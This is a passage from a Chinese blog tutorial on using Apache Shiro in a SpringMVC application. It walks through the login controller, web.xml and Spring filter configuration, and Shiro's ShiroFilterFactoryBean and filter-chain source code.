System.out.println(msg);</span><br><span class="line">        &#125; catch (ExcessiveAttemptsException e) &#123;</span><br><span class="line">            msg = &quot;登录失败次数过多&quot;;</span><br><span class="line">            model.addAttribute(&quot;message&quot;, msg);</span><br><span class="line">            System.out.println(msg);</span><br><span class="line">        &#125; catch (LockedAccountException e) &#123;</span><br><span class="line">            msg = &quot;帐号已被锁定. The account for username &quot; + token.getPrincipal() + &quot; was locked.&quot;;</span><br><span class="line">            model.addAttribute(&quot;message&quot;, msg);</span><br><span class="line">            System.out.println(msg);</span><br><span class="line">        &#125; catch (DisabledAccountException e) &#123;</span><br><span class="line">            msg = &quot;帐号已被禁用. The account for username &quot; + token.getPrincipal() + &quot; was disabled.&quot;;</span><br><span class="line">            model.addAttribute(&quot;message&quot;, msg);</span><br><span class="line">            System.out.println(msg);</span><br><span class="line">        &#125; catch (ExpiredCredentialsException e) &#123;</span><br><span class="line">            msg = &quot;帐号已过期. the account for username &quot; + token.getPrincipal() + &quot; was expired.&quot;;</span><br><span class="line">            model.addAttribute(&quot;message&quot;, msg);</span><br><span class="line">        &#125;catch (UnknownAccountException e) &#123;</span><br><span class="line">            msg = &quot;帐号不存在. There is no user with username of &quot; + token.getPrincipal();</span><br><span class="line">            model.addAttribute(&quot;message&quot;, msg);</span><br><span class="line">            System.out.println(msg);</span><br><span class="line">        &#125; catch (UnauthorizedException e) &#123;</span><br><span class="line">            msg = &quot;您没有得到相应的授权！&quot; + e.getMessage();</span><br><span class="line">            model.addAttribute(&quot;message&quot;, msg);</span><br><span class="line">            System.out.println(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;登录失败!&quot;);</span><br><span class="line">        return &quot;/jsp/login.jsp&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public String doLogout(ModelMap model)&#123;</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        subject.logout();</span><br><span class="line">        model.remove(&quot;user&quot;);</span><br><span class="line">        return &quot;/jsp/login.jsp&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>以上便是SpringMVC web中Shiro简单使用的依赖、配置、接口等，通过其，我们就能畅快的使用shiro的各种特性和功能了。</p>
+<h4 id="2-源码运行原理"><a href="#2-源码运行原理" class="headerlink" title="2. 源码运行原理"></a>2. 源码运行原理</h4><p>回顾上面的Shiro的web配置，我们可以发现其中有一个filter的配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;true&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;!-- shiro的filter-mapping--&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure>
+<p>从明面上我们只要写过Spring项目都不会陌生，filter注册了一个过滤器，而filter-mapping是对其filter访问过滤url的一个匹配配置，也就是说，上面的filter-mapping配置，规定了shiroFilter这个过滤器，将会过滤任何一个请求到该项目的http请求。</p>
+<p>不过，这里还有一个重点，就是DelegatingFilterProxy这个利用了门面模式设计的一个class，它是一个filter的代理类，通过这个类可以代理一个spring容器管理的filter的生命周期，也就是说，可以在Spring容器中创建一个filter bean，然后注入一系列依赖，这个bean可以用代理的方式配置到web.xml中使用。</p>
+<p>我们再看会前面的spring-shiro.xml文件，其中，我们配置了这样的一个bean</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 对应于web.xml中配置的那个shiroFilter --&gt;</span><br><span class="line">&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;</span><br><span class="line">    &lt;!-- Shiro的核心安全接口，这个属性是必须的 --&gt;</span><br><span class="line">    &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt;</span><br><span class="line">    &lt;!-- 要求登录时的链接(登录页面地址)，非必须的属性，默认会自动寻找Web工程根目录下的&quot;/login.jsp&quot;页面 --&gt;</span><br><span class="line">    &lt;property name=&quot;loginUrl&quot; value=&quot;/jsp/login.jsp&quot;/&gt;</span><br><span class="line">    &lt;!-- 登录成功后要跳转的连接(本例中此属性用不到，因为登录成功后的处理逻辑在LoginController里硬编码) --&gt;</span><br><span class="line">    &lt;!-- &lt;property name=&quot;successUrl&quot; value=&quot;/&quot; &gt;&lt;/property&gt; --&gt;</span><br><span class="line">    &lt;!-- 用户访问未对其授权的资源时，所显示的连接 --&gt;</span><br><span class="line">    &lt;property name=&quot;unauthorizedUrl&quot; value=&quot;/html/error.html&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;property name=&quot;filterChainDefinitions&quot;&gt;</span><br><span class="line">        &lt;value&gt;</span><br><span class="line">            /html/admin/**=authc,roles[admin]</span><br><span class="line">            /html/user/**=user,roles[user]</span><br><span class="line">            /jsp/admin/**=authc,roles[admin]</span><br><span class="line">            /jsp/user/**=user,roles[user]</span><br><span class="line">            &lt;!--/dologin=ssl--&gt;</span><br><span class="line">        &lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到，它的bean id和我们在web.xml配置的filter名称是一样的，也就是说，这个filter是它的代理门面类，在访问该web项目时的任何一个请求，都将被shiroFilter这个bean进行过滤。</p>
+<p>那么，接下来我们打开org.apache.shiro.spring.web.ShiroFilterFactoryBean这个bean，因为他是一个FactoryBean，因此，在该类的bean真正被使用的时候，会调用其getObject()方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Lazily creates and returns a &#123;@link AbstractShiroFilter&#125; concrete instance via the</span><br><span class="line"> * &#123;@link #createInstance&#125; method.</span><br><span class="line"> *</span><br><span class="line"> * @return the application&apos;s Shiro Filter instance used to filter incoming web requests.</span><br><span class="line"> * @throws Exception if there is a problem creating the &#123;@code Filter&#125; instance.</span><br><span class="line"> */</span><br><span class="line">public Object getObject() throws Exception &#123;</span><br><span class="line">    if (instance == null) &#123;</span><br><span class="line">        instance = createInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    return instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看方法注释可以清楚的看到，这是一个懒加载的bean，当使用到它时，才会调用其getObject()方法，然后再该方法中，我们可以看到，通过createInstance()创建一个真正的实例作为该bean</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">protected AbstractShiroFilter createInstance() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    log.debug(&quot;Creating Shiro Filter instance.&quot;);</span><br><span class="line">    </span><br><span class="line">    SecurityManager securityManager = getSecurityManager();</span><br><span class="line">    if (securityManager == null) &#123;</span><br><span class="line">        String msg = &quot;SecurityManager property must be set.&quot;;</span><br><span class="line">        throw new BeanInitializationException(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!(securityManager instanceof WebSecurityManager)) &#123;</span><br><span class="line">        String msg = &quot;The security manager does not implement the WebSecurityManager interface.&quot;;</span><br><span class="line">        throw new BeanInitializationException(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FilterChainManager manager = createFilterChainManager();</span><br><span class="line"></span><br><span class="line">    //Expose the constructed FilterChainManager by first wrapping it in a</span><br><span class="line">    // FilterChainResolver implementation. The AbstractShiroFilter implementations</span><br><span class="line">    // do not know about FilterChainManagers - only resolvers:</span><br><span class="line">    PathMatchingFilterChainResolver chainResolver = new PathMatchingFilterChainResolver();</span><br><span class="line">    chainResolver.setFilterChainManager(manager);</span><br><span class="line"></span><br><span class="line">    //Now create a concrete ShiroFilter instance and apply the acquired SecurityManager and built</span><br><span class="line">    //FilterChainResolver.  It doesn&apos;t matter that the instance is an anonymous inner class</span><br><span class="line">    //here - we&apos;re just using it because it is a concrete AbstractShiroFilter instance that accepts</span><br><span class="line">    //injection of the SecurityManager and FilterChainResolver:</span><br><span class="line">    return new SpringShiroFilter((WebSecurityManager) securityManager, chainResolver);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>回顾一开始我们在bean配置文件对ShiroFilterFactoryBean配置，SecurityManager我们配置的是org.apache.shiro.web.mgt.DefaultWebSecurityManager，一个默认的web安全管理器，这个web安全管理器配置了一个realm，该realm我们可以使用shiro包内置的jdbc快捷使用的org.apache.shiro.realm.jdbc.JdbcRealm，也可以我们自定义去实现登录验证和授权相关方法的realm，总的来说，通过web安全管理器，我们可以配置相关的登录验证和授权配置，这也是使用shiro中非常关键的一点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 使用Shiro自带的JdbcRealm类 指定密码匹配所需要用到的加密对象 指定存储用户、角色、权限许可的数据源及相关查询语句 --&gt;</span><br><span class="line">&lt;bean id=&quot;jdbcRealm&quot; class=&quot;org.apache.shiro.realm.jdbc.JdbcRealm&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;credentialsMatcher&quot; ref=&quot;credentialsMatcher&quot;&gt;&lt;/property&gt;</span><br><span class="line">    &lt;property name=&quot;permissionsLookupEnabled&quot; value=&quot;true&quot;&gt;&lt;/property&gt;</span><br><span class="line">    &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;&gt;&lt;/property&gt;</span><br><span class="line">    &lt;property name=&quot;authenticationQuery&quot; value=&quot;SELECT passwd FROM userTB WHERE login_name = ?&quot;&gt;&lt;/property&gt;</span><br><span class="line">    &lt;property name=&quot;userRolesQuery&quot; value=&quot;SELECT role_name from userTB left join roleTB using(role_id) WHERE login_name = ?&quot;&gt;&lt;/property&gt;</span><br><span class="line">    &lt;property name=&quot;permissionsQuery&quot; value=&quot;SELECT permission_name FROM permissionTB left join roleTB using(role_id) WHERE role_name = ?&quot;&gt;&lt;/property&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;!-- Shiro安全管理器 --&gt;</span><br><span class="line">&lt;bean id=&quot;securityManager&quot; class=&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;&gt;</span><br><span class="line">    &lt;property name=&quot;realm&quot; ref=&quot;jdbcRealm&quot;&gt;&lt;/property&gt;</span><br><span class="line">    &lt;property name=&quot;cacheManager&quot; ref=&quot;shiroCacheManager&quot;&gt;&lt;/property&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
+<p>如果我们想要使用简洁预置的JdbcRealm，我们只要创建三个表（用户、角色、权限），并把相应的sql查询语句设置好，就能快速的使用Shiro的Jdbc持久化用户、角色、权限数据。</p>
+<p>在createInstance()方法的一开始，就会对我们设置的web安全管理器进行校验，只有满足情况下，shiro的功能才能继续并正确使用。</p>
+<p>接着，调用其createFilterChainManager()方法，创建一个过滤器链的管理器，它也是shiro中非常核心的部分，我们一般在使用shiro的时候，如果我们要加入图形验证码、短信验证码等验证，都会通过filter的形式添加，然后把它添加到我们要创建的过滤器链的管理器（FilterChainManager），在访问到符合规则配置的path时，就会到达我们添加的图形、短信验证码校验filter中。当然，除了图形、短信验证等逻辑外，我们一般给一些页面、接口，设置成游客可访问，或者登陆状态可访问，亦或者使用rememberMe功能（在用户Session过期后，可以通过Cookie的RememberMe进行重新免登陆认证）等等。</p>
+<p>创建好FilterChainManager后，就会把它设置到一个新建的PathMatchingFilterChainResolver中，这个resolver的作用是在一个http请求进来时，用于提取http请求的path，然后匹配相应的FilterChains进行过滤请求。</p>
+<p>最后创建一个内部的静态类SpringShiroFilter返回，作为该工厂bean实际创建的bean对象。</p>
+<p>我们进一步跟进createFilterChainManager()方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">protected FilterChainManager createFilterChainManager() &#123;</span><br><span class="line"></span><br><span class="line">    DefaultFilterChainManager manager = new DefaultFilterChainManager();</span><br><span class="line">    Map&lt;String, Filter&gt; defaultFilters = manager.getFilters();</span><br><span class="line">    //apply global settings if necessary:</span><br><span class="line">    for (Filter filter : defaultFilters.values()) &#123;</span><br><span class="line">        applyGlobalPropertiesIfNecessary(filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //Apply the acquired and/or configured filters:</span><br><span class="line">    Map&lt;String, Filter&gt; filters = getFilters();</span><br><span class="line">    if (!CollectionUtils.isEmpty(filters)) &#123;</span><br><span class="line">        for (Map.Entry&lt;String, Filter&gt; entry : filters.entrySet()) &#123;</span><br><span class="line">            String name = entry.getKey();</span><br><span class="line">            Filter filter = entry.getValue();</span><br><span class="line">            applyGlobalPropertiesIfNecessary(filter);</span><br><span class="line">            if (filter instanceof Nameable) &#123;</span><br><span class="line">                ((Nameable) filter).setName(name);</span><br><span class="line">            &#125;</span><br><span class="line">            //&apos;init&apos; argument is false, since Spring-configured filters should be initialized</span><br><span class="line">            //in Spring (i.e. &apos;init-method=blah&apos;) or implement InitializingBean:</span><br><span class="line">            manager.addFilter(name, filter, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //build up the chains:</span><br><span class="line">    Map&lt;String, String&gt; chains = getFilterChainDefinitionMap();</span><br><span class="line">    if (!CollectionUtils.isEmpty(chains)) &#123;</span><br><span class="line">        for (Map.Entry&lt;String, String&gt; entry : chains.entrySet()) &#123;</span><br><span class="line">            String url = entry.getKey();</span><br><span class="line">            String chainDefinition = entry.getValue();</span><br><span class="line">            manager.createChain(url, chainDefinition);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return manager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到在创建FilterChainManager的地方，可以分为三个创建步骤</p>
+<ol>
+<li>默认创建的，对其自带的Filter进行全局配置的设置</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DefaultFilterChainManager manager = new DefaultFilterChainManager();</span><br><span class="line">Map&lt;String, Filter&gt; defaultFilters = manager.getFilters();</span><br><span class="line">//apply global settings if necessary:</span><br><span class="line">for (Filter filter : defaultFilters.values()) &#123;</span><br><span class="line">    applyGlobalPropertiesIfNecessary(filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private void applyGlobalPropertiesIfNecessary(Filter filter) &#123;</span><br><span class="line">    applyLoginUrlIfNecessary(filter);</span><br><span class="line">    applySuccessUrlIfNecessary(filter);</span><br><span class="line">    applyUnauthorizedUrlIfNecessary(filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那默认自带的filter究竟有哪些呢？跟进DefaultFilterChainManager一探究竟</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public DefaultFilterChainManager() &#123;</span><br><span class="line">    this.filters = new LinkedHashMap&lt;String, Filter&gt;();</span><br><span class="line">    this.filterChains = new LinkedHashMap&lt;String, NamedFilterList&gt;();</span><br><span class="line">    addDefaultFilters(false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected void addDefaultFilters(boolean init) &#123;</span><br><span class="line">    for (DefaultFilter defaultFilter : DefaultFilter.values()) &#123;</span><br><span class="line">        addFilter(defaultFilter.name(), defaultFilter.newInstance(), init, false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看见，其构造方法调用了addDefaultFilters方法，把DefaultFilter枚举类进行了遍历，然后添加到filter集合中</p>
+<p>查看该枚举类，可以发现一共有11个预置的filter：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">anon(AnonymousFilter.class),</span><br><span class="line">authc(FormAuthenticationFilter.class),</span><br><span class="line">authcBasic(BasicHttpAuthenticationFilter.class),</span><br><span class="line">logout(LogoutFilter.class),</span><br><span class="line">noSessionCreation(NoSessionCreationFilter.class),</span><br><span class="line">perms(PermissionsAuthorizationFilter.class),</span><br><span class="line">port(PortFilter.class),</span><br><span class="line">rest(HttpMethodPermissionFilter.class),</span><br><span class="line">roles(RolesAuthorizationFilter.class),</span><br><span class="line">ssl(SslFilter.class),</span><br><span class="line">user(UserFilter.class);</span><br></pre></td></tr></table></figure>
+<p>而其中，我们最常使用的大概是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. anon：无需登录认证即可访问</span><br><span class="line">2. authc：需要登录认证才可访问</span><br><span class="line">3. logout：注销filter</span><br><span class="line">4. perms：具有特点权限授权才可访问</span><br><span class="line">5. roles：某个角色才可访问</span><br><span class="line">6. user：使用RememberMe</span><br></pre></td></tr></table></figure>
+<p>以上这些便是第一步所做的一切。</p>
+<ol start="2">
+<li>对我们要添加或者修改的filter进行遍历配置</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Filter&gt; filters = getFilters();</span><br><span class="line">if (!CollectionUtils.isEmpty(filters)) &#123;</span><br><span class="line">    for (Map.Entry&lt;String, Filter&gt; entry : filters.entrySet()) &#123;</span><br><span class="line">        String name = entry.getKey();</span><br><span class="line">        Filter filter = entry.getValue();</span><br><span class="line">        applyGlobalPropertiesIfNecessary(filter);</span><br><span class="line">        if (filter instanceof Nameable) &#123;</span><br><span class="line">            ((Nameable) filter).setName(name);</span><br><span class="line">        &#125;</span><br><span class="line">        //&apos;init&apos; argument is false, since Spring-configured filters should be initialized</span><br><span class="line">        //in Spring (i.e. &apos;init-method=blah&apos;) or implement InitializingBean:</span><br><span class="line">        manager.addFilter(name, filter, false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不像前面默认预置的filter，从枚举类遍历获取，我们添加或修改的filter，都是首先设置到ShiroFilterFactoryBean中的，所以会从其中读取所以我们需要添加、修改的filter出来，然后进行全局的配置设置</p>
+<p>在这一处，我们添加或修改的filter，其实就如我们前面所讲的，我们一般在使用shiro的时候，如果我们要加入图形验证码、短信验证码等验证，都会通过filter的形式添加，这里面的filter就是这一步中遍历的filter了。</p>
+<ol start="3">
+<li>创建过滤器链（filter chains）</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; chains = getFilterChainDefinitionMap();</span><br><span class="line">if (!CollectionUtils.isEmpty(chains)) &#123;</span><br><span class="line">    for (Map.Entry&lt;String, String&gt; entry : chains.entrySet()) &#123;</span><br><span class="line">        String url = entry.getKey();</span><br><span class="line">        String chainDefinition = entry.getValue();</span><br><span class="line">        manager.createChain(url, chainDefinition);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，getFilterChainDefinitionMap()方法读取的集合，其实回顾到我们前面所描述的配置spring-shiro.xml中，可以看到，我们其实做了这样的一个配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/html/admin/**=authc,roles[admin]</span><br><span class="line">/html/user/**=user,roles[user]</span><br><span class="line">/jsp/admin/**=authc,roles[admin]</span><br><span class="line">/jsp/user/**=user,roles[user]</span><br></pre></td></tr></table></figure>
+<p>在第一步，就讲述了默认内置的filter具有哪些，以及一些常用的filter</p>
+<p>可以看到，上面的四个FilterChainDefinition，都使用了最常用的filter</p>
+<ul>
+<li>/html/admin/**：该路径的请求，需要当前用户在登录认证后的状态，以及用户为admin角色时才可访问</li>
+<li>/html/user/**：该路径的请求，在用户曾经登录认证时，勾选了RememberMe，在后续登录状态，也即Session过期后，可以通过Cookie中的RememberMe进行免登录认证</li>
+<li>/jsp/admin/**：与上述/html/admin/一致</li>
+<li>/jsp/user/**：与上述/html/user/一致</li>
+</ul>
+<p>也就是说，过滤器链的创建，跟这个FilterChainDefinition紧密关联，对于每一个path的配置，都会创建一个相应的过滤器链</p>
+<p>看到这里，应该还会有人问，什么是过滤器链？</p>
+<p>在shiro中，过滤器链就是我们前面两个步骤中的过滤器组成的一条链，当一个符合路径规则的请求进来后，都需要通过其执行一系列的过滤。</p>
+<p>回到createInstance()方法，我们继续跟到下一个，也就是我们之前所说的PathMatchingFilterChainResolver的创建，前面也讲过了，这个resolver的作用是在一个http请求进来时，用于提取http请求的path，然后匹配相应的FilterChains进行过滤请求，也就是说，我们前面根据配置创建的过滤器链，需要通过这个resolver，才能知道某个请求执行哪一个过滤器链，为了一究其匹配原理，我们跟进PathMatchingFilterChainResolver</p>
+<p>审阅代码，可以看到一个关键的方法-getChain()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> public FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) &#123;</span><br><span class="line">    FilterChainManager filterChainManager = getFilterChainManager();</span><br><span class="line">    if (!filterChainManager.hasChains()) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String requestURI = getPathWithinApplication(request);</span><br><span class="line"></span><br><span class="line">    //the &apos;chain names&apos; in this implementation are actually path patterns defined by the user.  We just use them</span><br><span class="line">    //as the chain name for the FilterChainManager&apos;s requirements</span><br><span class="line">    for (String pathPattern : filterChainManager.getChainNames()) &#123;</span><br><span class="line"></span><br><span class="line">        // If the path does match, then pass on to the subclass implementation for specific checks:</span><br><span class="line">        if (pathMatches(pathPattern, requestURI)) &#123;</span><br><span class="line">            if (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(&quot;Matched path pattern [&quot; + pathPattern + &quot;] for requestURI [&quot; + requestURI + &quot;].  &quot; +</span><br><span class="line">                        &quot;Utilizing corresponding filter chain...&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            return filterChainManager.proxy(originalChain, pathPattern);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个方法主要做了三件事情：</p>
+<ol>
+<li>获取并检查FilterChainManager</li>
+<li>获取当前请求的URL</li>
+<li>遍历过滤器链filter chains，匹配当前请求URL相应的filter chain去执行</li>
+</ol>
+<p>而上面第三件事情，就是PathMatchingFilterChainResolver的核心，它通过遍历我们前面创建的所有filter chains，回顾前面我们对FilterChainDefinition的配置，它的URL都是一个正则的匹配字符串，也就是说，通过它去正则匹配当前请求的URL，只要能匹配上的第一个filter chain，就是所要执行的过滤器链。</p>
+<p>在PathMatchingFilterChainResolver创建成功后，最后会把我们所创建的SecurityManager和PathMatchingFilterChainResolver，参与到SpringShiroFilter的实例化中来，并作为真正的ShiroFilterFactoryBean返回。</p>
+<p>SpringShiroFilter是ShiroFilterFactoryBean的一个静态内部类，它通过继承AbstractShiroFilter来实现shiro的核心功能（过滤请求）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static final class SpringShiroFilter extends AbstractShiroFilter &#123;</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先上跟进AbstractShiroFilter以及其父类OncePerRequestFilter，并继续向上跟进源码，我们可以发现，最早它们都实现了javax.servlet.Filter，所以表明它们就是一个不折不扣的过滤器，查看OncePerRequestFilter的源码也能发现其对doFilter()方法的实现，看到这里，大家也会很清晰了，这个filter在请求进来的时候，通过过滤器肯定是会执行到这个方法</p>
